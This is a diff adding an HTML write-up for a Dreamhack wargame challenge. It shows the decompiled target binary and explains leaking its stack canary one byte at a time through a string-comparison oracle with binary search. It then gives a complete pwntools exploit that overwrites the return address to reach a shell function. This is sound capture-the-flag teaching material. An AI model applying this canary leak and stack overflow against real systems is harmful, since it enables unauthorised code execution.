@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/980">here</a></p>
+        <p>The discompilation of the target program is as below.</p>
+        <pre><code>
+
+void newstrcmp(char *s1,long s2,int *result(index,(s1>=s2=1,s1&lt;s2=-1)))
+{
+  size_t len;
+  int bigger;
+  int i;
+  
+  len = strlen(s1);
+  i = 0;
+  while( true ) {
+    if ((int)len &lt;= i) {
+      result(index,(s1>=s2=1,s1&lt;s2=-1))[1] = 0;
+      *result(index,(s1>=s2=1,s1&lt;s2=-1)) = -1;
+      return;
+    }
+    if (s1[i] != *(char *)(s2 + i)) break;
+    i = i + 1;
+  }
+  if ((byte)s1[i] &lt; *(byte *)(s2 + i)) {
+    bigger = -1;
+  }
+  else {
+    bigger = 1;
+  }
+  result(index,(s1>=s2=1,s1&lt;s2=-1))[1] = bigger;
+  *result(index,(s1>=s2=1,s1&lt;s2=-1)) = i;
+  return;
+}
+
+void flag(void)
+
+{
+  long in_FS_OFFSET;
+  char *local_28;
+  undefined8 local_20;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  local_28 = "/bin/sh";
+  local_20 = 0;
+  execve("/bin/sh",&local_28,(char **)0x0);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+
+undefined8 main(void)
+{
+  long fs:;
+  uint trial;
+  uint first_difference(result);
+  int s1>=s2->1|s1&lt;s2->-1;
+  char exit? [2];
+  undefined1 s1 [16];
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined1 s2 [24];
+  long canary;
+  
+  canary = *(long *)(fs: + 0x28);
+  local_38 = 0;
+  local_30 = 0;
+  trial = 0;
+  setup();
+  puts("Tester for newstrcmp");
+  while( true ) {
+    trial = trial + 1;
+    printf("Trial: %d\n",(ulong)trial);
+    printf("Exit? (y/n): ");
+    read(0,exit?,2);
+    if (exit?[0] == 'y') break;
+    printf("Input string s1: ");
+    read(0,s1,0x40);
+    printf("Input string s2: ");
+    read(0,s2,0x40);
+    newstrcmp(s1,s2,&first_difference(result));
+    printf("Result of newstrcmp: ");
+    if (s1>=s2->1|s1&lt;s2->-1 == 0) {
+      puts("Two strings are the same!");
+    }
+    else if (s1>=s2->1|s1&lt;s2->-1 &lt; 0) {
+      printf("s1 is smaller than s2, first differs at %d\n",(ulong)first_difference(result));
+    }
+    else {
+      printf("s1 is larger than s2, first differs at %d\n",(ulong)first_difference(result));
+    }
+  }
+  if (canary != *(long *)(fs: + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+        </code></pre>
+        <p>We can deduce that the stack frame of <code>main</code> will look like below from the disassembly and decompilation.</p>
+        <img src="main_stackframe.png" width="20%" height="auto">
+        <p>
+            As you can see, a canary is blocking us from using BOF to overwrite the return address. So we need to leak the value of the canary.
+            Thankfully, since the program compares the two string <code>s1</code> and <code>s2</code>, we can use this information to repeatedly
+            check a character of the canary 1 at a time. Furthermore, since it tells you if <code>s1</code> is bigger or smaller than <code>s2</code>, we can
+            use this information and perform a binary search to reduce the time complexity of the exploit.
+            One thing to note though is that when probing for the last canary byte, we will have to check whether the index at which the two strings differ changed,
+            rather than checking if the program returned "The two strings are the same!" since <code>s1</code> would've been filled up with non-null characters by then,
+            causing the string comparison function to think that <code>s1</code> is longer than what it actually is intended to be.
+            After figuring out the canary, creating a payload to overwrite the return address is trivial. 
+            The exploit code is as below.
+        </p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def binary_search(known:bytes):
+    h = 255
+    l = 0
+    prev_diff_index = -1
+    is_first_trial = True
+    while h >= l:
+        p.sendafter(b"Exit? (y/n): ", b"n")
+        mid = (h+l)//2
+        mid_byte = p8(mid)
+        p.sendafter(b"s1: ", bytes.ljust(b"A"*24 + b"B" + known + mid_byte, 32, b"\x00"))
+        p.sendafter(b"s2: ",  b"A"*24 + b"B")
+
+        r = p.recvline()
+        is_smaller = b"smaller" in r
+        is_same = b"same" in r
+        
+        try: difference_index = int(r.rstrip()[-2:].strip())
+        except ValueError: difference_index = -1
+        
+        if (not is_first_trial) and difference_index > prev_diff_index: return mid
+        else: prev_diff_index = difference_index
+
+        is_first_trial = False
+
+        if is_same: return mid
+        elif is_smaller: l = mid + 1
+        else: h = mid - 1
+    return -1      
+
+if __name__ == "__main__":
+    #p = process("./newstrcmp")
+    p = remote("host8.dreamhack.games", 11868)
+    input()
+    #context.log_level = "debug"
+    canary = b""
+    for i in range(1,8):
+        res = binary_search(canary)
+        canary += p8(res)
+    canary = b"\x00" + canary
+    print(f"canary is {canary}")
+    flag = 0x40125b
+    p.sendafter(b"Exit? (y/n): ", b"n")
+    p.sendafter(b"s1: ", b"a")
+    p.sendafter(b"s2: ", b"A"*24 + canary + b"B"*8 + p64(flag))
+    p.sendafter(b"Exit? (y/n): ", b"y")
+    p.interactive()
+        </code></pre>
+        
+    </main>
+</body>
+</html>
